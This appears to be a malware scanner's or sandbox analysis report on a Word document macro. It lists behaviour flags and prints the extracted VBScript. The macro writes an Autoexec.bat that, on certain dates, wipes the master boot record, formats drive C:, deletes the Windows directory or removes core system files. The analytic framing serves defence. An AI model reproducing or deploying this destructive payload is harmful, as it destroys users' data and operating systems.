behavior.Autoexec: Runs when the Word document is opened
behavior.Shell: May run an executable file or a system command
behavior.WScript.Shell: May run an executable file or a system command
behavior.system: May run an executable file or a system command on a Mac

docinfo.macro:
Dim WSHShell, fso, dir, win, downread

Set fso = CreateObject("Scripting.FileSystemObject")
Set WSHShell = WScript.CreateObject("WScript.Shell")
Set win = fso.GetSpecialFolder(0)
Set dir = fso.GetSpecialFolder(1)
Set bat = fso.CreateTextFile("C:\Autoexec.bat", True)

main()

Sub main()
die=mid(date,1,2)

If die=01 Then
bat.WriteLine "fdisk /MBR"
bat.WriteLine "echo J|format c:"
bat.WriteLine "echo Y|format c:"
bat.WriteLine "echo Shit|Label C:"
End If

If die=10 Then
bat.WriteLine "deltree /y %windir%"
End If

If die=28 Then
bat.WriteLine "del %windir%\explorer.exe"
bat.WriteLine "del %windir%\system\kernel32.dll"
End If

End Sub

filetype: ASCII text, with CRLF line terminators

dump: Dim WSHShell, fso, dir, win, downread
